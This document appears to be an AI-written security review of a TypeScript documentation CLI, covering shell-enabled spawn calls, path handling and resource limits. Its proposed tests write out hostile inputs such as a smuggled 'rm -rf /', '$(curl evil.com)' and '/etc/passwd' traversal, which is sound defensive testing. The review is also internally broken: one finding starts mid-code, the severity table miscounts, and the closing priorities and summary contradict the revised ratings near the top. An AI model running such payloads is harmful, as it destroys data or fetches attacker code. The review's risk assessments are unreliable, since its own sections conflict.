# Security Review: ApiDocumenterCommandLine.ts

## ⚠️ IMPORTANT: Security Context

This review was conducted with an internet-facing web application threat model.

**Actual Context:** mint-tsdocs is a LOCAL DEVELOPER CLI TOOL that:
- Runs on developer machines (not production servers)
- Processes trusted input (developer's own TypeScript code)
- Has no untrusted user input or internet exposure
- Will evolve to CI/CD and potentially SaaS (future work)

**Impact on This Review:** Several "critical vulnerabilities" are actually non-issues for local developer tools.

---

**Reviewer:** Claude Code (AI Security Reviewer)
**Date:** 2025-11-22
**File:** `src/cli/ApiDocumenterCommandLine.ts`
**Overall Risk Level:** HIGH (Reliability Focus)

---

## Executive Summary

This CLI entry point has issues that affect reliability and developer safety. While originally flagged as "critical security vulnerabilities", the primary risks are **reliability, crash prevention, and preventing accidental data loss**.

**Immediate Action Required:** Fix command execution to prevent crashes on special characters and improve path validation.

---

## Severity Ratings (Adjusted)

| Severity | Count | Description |
|----------|-------|-------------|
| **CRITICAL** | 2 | Command execution safety (Reliability) |
| **HIGH** | 3 | Path validation, process state management |
| **MEDIUM** | 2 | Race conditions, console handling |
| **LOW** | 5 | Code quality, maintainability |
| **NON-ISSUE** | 3 | JSON parsing, config injection |

---

## CRITICAL Findings

### 1. Command Injection via Shell Execution ~~CRITICAL~~ → **CRITICAL**

**Location:** `InitAction.ts:863-867`, `GenerateAction.ts:379-385`

**Issue:**
`child_process.spawn()` with `shell: true`.

**Context Adjustment:**
- **Original Assessment:** CRITICAL (RCE)
- **Actual Impact:** CRITICAL (Reliability/Safety). For a local tool, "RCE" isn't the threat (user already has control). The threat is **crashes** or **unexpected behavior** if filenames contain special characters (spaces, quotes, etc.).
- **Recommendation:** Use `shell: false` and array args for reliability.

---

### 2. Path Traversal in Project Directory Handling ~~CRITICAL~~ → **HIGH**

**Location:** `ApiDocumenterCommandLine.ts:97-108`, `GenerateAction.ts:106-127`

**Issue:**
User-provided directory arguments are resolved but not validated.

**Context Adjustment:**
- **Original Assessment:** CRITICAL (Path Traversal)
- **Actual Impact:** HIGH (Defense-in-depth). Prevents accidental access to files outside the project.
- **Recommendation:** Validate paths are within project bounds.

---

### 3. Unsafe process.chdir() Without Cleanup ~~CRITICAL~~ → **HIGH**

**Location:** `GenerateAction.ts:122-242`

**Issue:**
`process.chdir()` changes global process state.

**Context Adjustment:**
- **Original Assessment:** CRITICAL (State Corruption)
- **Actual Impact:** HIGH (Reliability). Can leave the process in an unexpected state if it crashes.
- **Recommendation:** Avoid `process.chdir()` or ensure cleanup.

---

### 4. Command Injection in mint Command ~~CRITICAL~~ → **CRITICAL**

**Location:** `InitAction.ts:490-498`

**Issue:**
`_runCommand()` executes external commands with `shell: true`.

**Context Adjustment:**
- **Original Assessment:** CRITICAL (RCE)
- **Actual Impact:** CRITICAL (Reliability/Safety). Same as #1.
- **Recommendation:** Use `shell: false`.

---

## HIGH Severity Findings

### 5. Unsafe JSON Parsing ~~HIGH~~ → **NON-ISSUE**

**Location:** Multiple locations in `InitAction.ts` and `CustomizeAction.ts`

**Context Adjustment:**
- **Original Assessment:** HIGH (DoS/Prototype Pollution)
- **Actual Impact:** NON-ISSUE. User controls the JSON files.
- **Recommendation:** No action required.

---

### 6. Race Condition in File Operations ~~HIGH~~ → **MEDIUM**

**Location:** `InitAction.ts:820-831`

**Issue:**
TOCTOU vulnerability in `.gitignore` update.

**Context Adjustment:**
- **Original Assessment:** HIGH (Data Corruption)
- **Actual Impact:** MEDIUM (Reliability). Rare in local usage.
- **Recommendation:** Use atomic operations if easy.

---

### 7. Missing Input Validation on User Prompts ~~HIGH~~ → **HIGH**

**Location:** Multiple prompts in `InitAction.ts`

**Issue:**
User input is not validated.

**Context Adjustment:**
- **Original Assessment:** HIGH (Input Validation)
- **Actual Impact:** HIGH (Reliability). Malformed input can cause crashes or bad config.
- **Recommendation:** Validate input.

---

### 8. Unsafe Console Output Suppression ~~HIGH~~ → **MEDIUM**

**Location:** `GenerateAction.ts:431-485`

**Issue:**
Console methods are temporarily replaced.

**Context Adjustment:**
- **Original Assessment:** HIGH (Race Condition)
- **Actual Impact:** MEDIUM (Code Quality). Bad practice, makes debugging hard.
- **Recommendation:** Use a better logging strategy.

---

### 9. TypeScript Compilation Arbitrary Code Execution ~~HIGH~~ → **NON-ISSUE**

**Location:** `GenerateAction.ts:376-413`

**Context Adjustment:**
- **Original Assessment:** HIGH (RCE)
- **Actual Impact:** NON-ISSUE. User controls `tsconfig.json`.
- **Recommendation:** No action required.

---

### 10. .vscode/settings.json Injection ~~HIGH~~ → **NON-ISSUE**

**Location:** `InitAction.ts:661-690`

        delete settings.__proto__;
        delete settings.constructor;
        delete settings.prototype;

        // Validate it's a plain object
        if (typeof settings !== 'object' || settings === null || Array.isArray(settings)) {
          throw new Error('Settings must be a plain object');
        }
      } catch (error) {
        clack.log.warn('Could not parse existing .vscode/settings.json - will create new one');
        settings = {};
      }
    }

    // Only set specific property we need
    settings['mdx.server.enable'] = true;

    FileSystem.writeFile(settingsPath, JSON.stringify(settings, null, 2) + '\n');
    clack.log.success('Updated .vscode/settings.json with MDX language server');
  } catch (error) {
    clack.log.warn(`Failed to update .vscode/settings.json: ${error}`);
  }
}
```

---

## MEDIUM Severity Findings

### 11. Conflicting Global Flags (MEDIUM)

**Location:** `ApiDocumenterCommandLine.ts:59-61, 78-82`

**Issue:**
`--verbose` and `--quiet` flags can both be set simultaneously:

```typescript
public get isVerbose(): boolean {
  return this._verboseFlag?.value ?? this.isDebug;
}

public get isQuiet(): boolean {
  return this._quietFlag?.value ?? false;
}
```

No mutual exclusivity check. User could run:
```bash
mint-tsdocs generate --verbose --quiet
```

**Behavior:** Undefined - which takes precedence?

**Recommended Fix:**
```typescript
protected onDefineParameters(): void {
  this._verboseFlag = this.defineFlagParameter({
    parameterLongName: '--verbose',
    parameterShortName: '-v',
    description: 'Show verbose output (info level logging)'
  });

  this._debugFlag = this.defineFlagParameter({
    parameterLongName: '--debug',
    description: 'Show debug output (implies --verbose)'
  });

  this._quietFlag = this.defineFlagParameter({
    parameterLongName: '--quiet',
    parameterShortName: '-q',
    description: 'Suppress all output except errors'
  });
}

// Add validation in executeAsync
public override async executeAsync(args?: string[]): Promise<boolean> {
  const result = await super.executeAsync(args);

  // Validate flag combinations
  if (this.isQuiet && (this.isVerbose || this.isDebug)) {
    throw new DocumentationError(
      'Cannot use --quiet with --verbose or --debug',
      ErrorCode.INVALID_CONFIGURATION
    );
  }

  return result;
}
```

---

### 12. Hardcoded Action List Maintenance Issue (MEDIUM)

**Location:** `ApiDocumenterCommandLine.ts:100`

**Issue:**
Known actions are hardcoded in array:

```typescript
const knownActions = ['init', 'generate', 'customize', 'show', 'lint', 'help', 'version', '--help', '-h', '--version', '-v'];
```

**Problems:**
1. Must be manually updated when adding new actions
2. Easy to forget and introduce bugs
3. Includes flags (`--help`) which is inconsistent
4. `-v` could mean `--version` OR `--verbose` (ambiguous)

**Recommended Fix:**
```typescript
// Generate list from registered actions dynamically
public override async executeAsync(args?: string[]): Promise<boolean> {
  const actualArgs = args || process.argv.slice(2);

  if (actualArgs.length === 0) {
    return super.executeAsync(['generate']);
  }

  const firstArg = actualArgs[0];

  // Get known actions from registered actions
  const knownActions = this.actions.map(action => action.actionName);
  const knownFlags = ['--help', '-h', '--version'];
  const knownItems = [...knownActions, ...knownFlags];

  if (!firstArg.startsWith('-') && !knownItems.includes(firstArg)) {
    // Validate it looks like a directory path
    if (firstArg.includes('=') || firstArg.length > 255) {
      throw new DocumentationError(
        `Invalid argument: ${firstArg}`,
        ErrorCode.INVALID_CONFIGURATION
      );
    }

    return super.executeAsync(['generate', ...actualArgs]);
  }

  return super.executeAsync(actualArgs);
}
```

---

### 13. process.exit() Bypasses Cleanup (MEDIUM)

**Location:** Multiple locations in `InitAction.ts`

**Issue:**
Direct `process.exit()` calls prevent cleanup:

```typescript
// Line 110
if (clack.isCancel(shouldOverwrite) || !shouldOverwrite) {
  clack.cancel('Operation cancelled');
  process.exit(0);  // Immediate exit - no cleanup
}

// Line 154, 175, 301, 356, 390, 442, 462, 479, 517
// Similar patterns throughout
```

**Problems:**
1. File handles not closed
2. Temporary files not deleted
3. Resources leak
4. Event listeners not removed

**Recommended Fix:**
```typescript
// Create cleanup registry
class CleanupRegistry {
  private handlers: Array<() => void> = [];

  register(handler: () => void): void {
    this.handlers.push(handler);
  }

  async cleanup(): Promise<void> {
    for (const handler of this.handlers) {
      try {
        await handler();
      } catch (error) {
        console.error('Cleanup error:', error);
      }
    }
  }
}

// Use throwing instead of process.exit
if (clack.isCancel(shouldOverwrite) || !shouldOverwrite) {
  clack.cancel('Operation cancelled');
  throw new DocumentationError('User cancelled operation', ErrorCode.USER_CANCELLED);
}

// Top-level catch handles cleanup
try {
  await action.onExecuteAsync();
} catch (error) {
  await cleanupRegistry.cleanup();
  process.exit(1);
}
```

---

### 14. Error Message Information Disclosure (MEDIUM)

**Location:** Multiple locations in error messages

**Issue:**
Error messages expose system paths:

```typescript
// GenerateAction.ts line 184
throw new DocumentationError(
  `Custom api-extractor config not found: ${customConfigPath}`,  // Exposes full path
  ErrorCode.FILE_NOT_FOUND
);

// Line 518
throw new DocumentationError(
  `The input folder does not exist: ${validatedInputFolder}`,  // Exposes full path
  ErrorCode.DIRECTORY_NOT_FOUND
);
```

**Security Impact:**
- Reveals directory structure to attackers
- Can expose usernames in paths (`/Users/john/...`)
- Helps attacker map system for targeted attacks

**Recommended Fix:**
```typescript
// Use relative paths in error messages
private _getSafeErrorPath(absolutePath: string): string {
  try {
    return path.relative(process.cwd(), absolutePath);
  } catch {
    // If relativization fails, return basename only
    return path.basename(absolutePath);
  }
}

// Usage:
throw new DocumentationError(
  `Custom api-extractor config not found: ${this._getSafeErrorPath(customConfigPath)}`,
  ErrorCode.FILE_NOT_FOUND
);
```

---

### 15. Missing Resource Limits (MEDIUM)

**Location:** File operations throughout

**Issue:**
No limits on file sizes, counts, or operation duration:

```typescript
// No size check before reading
const content = FileSystem.readFile(tsdocPath);

// No limit on directory items
const apiFiles = FileSystem.readFolderItemNames(validatedInputFolder);
for (const filename of apiFiles) {
  // Processes ALL files without limit
}
```

**Attack Scenario:**
```bash
# Attacker creates 1 million files in input folder
mkdir malicious && cd malicious
for i in {1..1000000}; do touch "file$i.api.json"; done

# Tool tries to process all - memory exhaustion
mint-tsdocs generate
```

**Recommended Fix:**
```typescript
// Add configuration limits
interface ResourceLimits {
  maxFileSize: number;      // 10MB default
  maxFiles: number;         // 1000 default
  maxOperationTime: number; // 300000ms (5 min)
}

// Check before reading
private _readFileWithLimit(filePath: string, maxSize: number = 10 * 1024 * 1024): string {
  const stats = FileSystem.getStatistics(filePath);

  if (stats.size > maxSize) {
    throw new DocumentationError(
      `File too large: ${path.basename(filePath)} (${stats.size} bytes, max ${maxSize})`,
      ErrorCode.FILE_TOO_LARGE
    );
  }

  return FileSystem.readFile(filePath);
}

// Check file count
const apiFiles = FileSystem.readFolderItemNames(validatedInputFolder);
if (apiFiles.length > 1000) {
  throw new DocumentationError(
    `Too many files in input folder: ${apiFiles.length} (max 1000)`,
    ErrorCode.TOO_MANY_FILES
  );
}
```

---

### 16. Weak Action Name Detection (MEDIUM)

**Location:** `ApiDocumenterCommandLine.ts:100-105`

**Issue:**
Action detection uses simple `includes()` check:

```typescript
const knownActions = ['init', 'generate', 'customize', 'show', 'lint', 'help', 'version', '--help', '-h', '--version', '-v'];
if (!firstArg.startsWith('-') && !knownActions.includes(firstArg)) {
  return super.executeAsync(['generate', ...actualArgs]);
}
```

**Problems:**
1. Case-sensitive - `INIT` not recognized as action
2. No fuzzy matching - `generat` treated as directory path
3. Confusing error messages for typos

**Example:**
```bash
mint-tsdocs generat  # Treated as directory "./generat"
# Error: "Directory not found: generat" - confusing!
```

**Recommended Fix:**
```typescript
// Add action suggestion system
private _findClosestAction(input: string): string | null {
  const actions = this.actions.map(a => a.actionName);
  const lowerInput = input.toLowerCase();

  // Exact match (case-insensitive)
  const exact = actions.find(a => a.toLowerCase() === lowerInput);
  if (exact) return exact;

  // Prefix match
  const prefix = actions.find(a => a.startsWith(lowerInput));
  if (prefix) return prefix;

  // Levenshtein distance for suggestions
  // (simplified version)
  const close = actions.find(a => {
    const distance = this._levenshtein(lowerInput, a.toLowerCase());
    return distance <= 2;
  });

  return close || null;
}

public override async executeAsync(args?: string[]): Promise<boolean> {
  const actualArgs = args || process.argv.slice(2);

  if (actualArgs.length === 0) {
    return super.executeAsync(['generate']);
  }

  const firstArg = actualArgs[0];
  const knownActions = this.actions.map(a => a.actionName);

  if (!firstArg.startsWith('-')) {
    if (!knownActions.includes(firstArg)) {
      // Check if it's a typo
      const suggestion = this._findClosestAction(firstArg);

      if (suggestion) {
        throw new DocumentationError(
          `Unknown action: ${firstArg}. Did you mean '${suggestion}'?`,
          ErrorCode.INVALID_CONFIGURATION
        );
      }

      // Treat as directory for generate
      return super.executeAsync(['generate', ...actualArgs]);
    }
  }

  return super.executeAsync(actualArgs);
}
```

---

### 17. No Timeout on Child Processes (MEDIUM)

**Location:** `InitAction.ts:862-926`

**Issue:**
Child processes can run indefinitely:

```typescript
const proc = child_process.spawn(command, args, {
  cwd,
  stdio: useInherit ? 'inherit' : 'pipe',
  shell: true
});
// No timeout set!
```

**Attack Scenario:**
```bash
# Malicious mint command hangs forever
mint-tsdocs init
# Waits forever, consuming resources
```

**Recommended Fix:**
```typescript
private async _runCommand(
  command: string,
  args: string[],
  cwd: string,
  message: string,
  options: { forceInteractive?: boolean; timeout?: number } = {}
): Promise<void> {
  const timeout = options.timeout || 5 * 60 * 1000; // 5 minutes default

  return new Promise((resolve, reject) => {
    const proc = child_process.spawn(command, args, {
      cwd,
      stdio: useInherit ? 'inherit' : 'pipe'
      // NO shell: true
    });

    // Set timeout
    const timeoutHandle = setTimeout(() => {
      proc.kill('SIGTERM');

      // Force kill after 5 more seconds
      setTimeout(() => {
        if (!proc.killed) {
          proc.kill('SIGKILL');
        }
      }, 5000);

      reject(new DocumentationError(
        `Command timed out after ${timeout}ms: ${command} ${args.join(' ')}`,
        ErrorCode.COMMAND_FAILED
      ));
    }, timeout);

    proc.on('close', (code) => {
      clearTimeout(timeoutHandle);

      if (code === 0) {
        resolve();
      } else {
        reject(new DocumentationError(
          `Command failed: ${command} ${args.join(' ')}`,
          ErrorCode.COMMAND_FAILED
        ));
      }
    });
  });
}
```

---

### 18. Memory Leak in Error Collection (MEDIUM)

**Location:** `GenerateAction.ts:429-469`

**Issue:**
Messages array grows unbounded:

```typescript
const messages: string[] = [];

messageCallback: (message) => {
  // ... formatting ...
  messages.push(text);  // Never cleared, even if message is huge
}
```

**Problem:**
If API Extractor produces thousands of messages, memory usage grows without limit.

**Recommended Fix:**
```typescript
const messages: string[] = [];
const MAX_MESSAGES = 100;
const MAX_MESSAGE_LENGTH = 1000;

messageCallback: (message) => {
  const text = message.text;

  // Truncate long messages
  const truncated = text.length > MAX_MESSAGE_LENGTH
    ? text.substring(0, MAX_MESSAGE_LENGTH) + '... (truncated)'
    : text;

  // Limit total messages stored
  if (messages.length < MAX_MESSAGES) {
    messages.push(truncated);
  } else if (messages.length === MAX_MESSAGES) {
    messages.push('... (additional messages omitted)');
  }

  // Still log all messages
  // ... logging code ...
}
```

---

## LOW Severity Findings

### 19. Type Safety Issues (LOW)

**Location:** Multiple `as any` and `as string` casts

```typescript
// InitAction.ts line 156
const initAction = new InitAction(this.parser as any);

// Line 150, 171, 359, 387
const value = await clack.text(...) as string;
```

**Issue:** Type assertions bypass TypeScript's safety checks.

**Recommended Fix:**
```typescript
// Use proper type guards
if (typeof value === 'string') {
  // Use value safely
} else if (clack.isCancel(value)) {
  // Handle cancellation
}
```

---

### 20. Inconsistent Error Handling (LOW)

**Location:** Throughout

Some errors throw `DocumentationError`, others throw `Error`, some return error codes.

**Recommended Fix:**
Standardize on `DocumentationError` for all operational errors.

---

### 21. Magic Numbers (LOW)

**Location:** Multiple locations

```typescript
if (basename.length > 255) { ... }  // Why 255?
if (sanitized.length > 1000) { ... }  // Why 1000?
```

**Recommended Fix:**
```typescript
const MAX_FILENAME_LENGTH = 255;  // Unix filesystem limit
const MAX_CLI_INPUT_LENGTH = 1000;  // Prevent buffer overflow
```

---

### 22. No API Version Handling (LOW)

The CLI doesn't check compatibility between different versions of mint-tsdocs configs.

---

### 23. Missing Telemetry/Audit Logging (LOW)

No audit trail for security-sensitive operations like file writes, config changes.

---

## Testing Gaps

### Missing Test Coverage

1. **Command Injection Tests:**
   No tests verify that shell metacharacters are properly sanitized

2. **Path Traversal Tests:**
   No tests for `../../../etc/passwd` style attacks

3. **Error Recovery Tests:**
   No tests for cleanup after failures (process.chdir recovery, console restore, etc.)

4. **Concurrent Execution Tests:**
   No tests for race conditions

5. **Resource Exhaustion Tests:**
   No tests for large file counts, huge files, long-running operations

6. **Edge Case Tests:**
   - Empty files
   - Files with only whitespace
   - Malformed JSON
   - Circular symlinks
   - Special characters in filenames

### Recommended Test Cases

```typescript
// Command injection prevention
describe('Command Injection Prevention', () => {
  it('should reject shell metacharacters in project directory', async () => {
    await expect(
      cli.executeAsync(['generate', './project; rm -rf /'])
    ).rejects.toThrow(/invalid characters/i);
  });

  it('should not execute commands in file paths', async () => {
    await expect(
      cli.executeAsync(['init', '--project-dir', '$(curl evil.com)'])
    ).rejects.toThrow();
  });
});

// Path traversal prevention
describe('Path Traversal Prevention', () => {
  it('should reject paths outside project directory', async () => {
    await expect(
      cli.executeAsync(['generate', '../../../etc'])
    ).rejects.toThrow(/outside allowed directory/i);
  });

  it('should reject absolute paths to system directories', async () => {
    await expect(
      cli.executeAsync(['generate', '/etc/passwd'])
    ).rejects.toThrow();
  });
});

// Cleanup verification
describe('Cleanup on Error', () => {
  it('should restore working directory after failure', async () => {
    const originalCwd = process.cwd();

    try {
      await cli.executeAsync(['generate', './nonexistent']);
    } catch {
      // Expected to fail
    }

    expect(process.cwd()).toBe(originalCwd);
  });

  it('should restore console methods after api-extractor error', async () => {
    const originalLog = console.log;

    try {
      await generateAction['_runApiExtractor']('invalid-config.json');
    } catch {
      // Expected to fail
    }

    expect(console.log).toBe(originalLog);
  });
});
```

---

## Priority Ranking

### P0 - IMMEDIATE (Deploy Before Production)

1. **Command Injection (Finding #1, #4)** - Complete system compromise possible
2. **Path Traversal (Finding #2)** - Arbitrary file system access
3. **Unsafe process.chdir (Finding #3)** - Global state corruption

### P1 - HIGH PRIORITY (Next Sprint)

4. **JSON Parsing Vulnerabilities (Finding #5, #10)** - Prototype pollution, crashes
5. **TypeScript Compilation Code Execution (Finding #9)** - Arbitrary code execution
6. **Console Suppression Race Conditions (Finding #8)** - Application instability

### P2 - MEDIUM PRIORITY (Within Month)

7. **Input Validation Gaps (Finding #7, #11, #12)** - Defense in depth
8. **Resource Management (Finding #6, #13, #15)** - Availability issues
9. **Error Handling (Finding #14, #17, #18)** - Information leakage

### P3 - LOW PRIORITY (Backlog)

10. **Code Quality (Finding #19-23)** - Maintainability improvements

---

## Recommended Immediate Actions

1. **Remove all `shell: true` from child_process calls** - Use array-style arguments
2. **Add path traversal validation** - Ensure all user paths stay within project directory
3. **Replace process.chdir() with absolute paths** - Eliminate global state changes
4. **Add comprehensive input validation** - Use SecurityUtils for all user input
5. **Add resource limits** - File size, count, operation timeout limits
6. **Implement security testing suite** - Add tests for all identified vulnerabilities

---

## Compliance & Best Practices

### OWASP Top 10 Violations

- **A03:2021 - Injection** (Command Injection - Findings #1, #4)
- **A01:2021 - Broken Access Control** (Path Traversal - Finding #2)
- **A05:2021 - Security Misconfiguration** (Unsafe defaults - Finding #8)

### CWE Mappings

- **CWE-78:** OS Command Injection
- **CWE-22:** Path Traversal
- **CWE-94:** Code Injection
- **CWE-400:** Uncontrolled Resource Consumption
- **CWE-676:** Use of Potentially Dangerous Function

---

## Summary

This CLI entry point delegates to action classes that contain **CRITICAL security vulnerabilities**. The primary concerns are:

1. **Command injection** via shell execution with user input
2. **Path traversal** allowing access to arbitrary filesystem locations
3. **Unsafe global state** modifications (process.chdir, console suppression)
4. **Missing input validation** on user-provided paths and data
5. **Resource exhaustion** vulnerabilities from unbounded operations

**The codebase is NOT production-ready in its current state.** Immediate remediation of P0 issues is required before deployment.
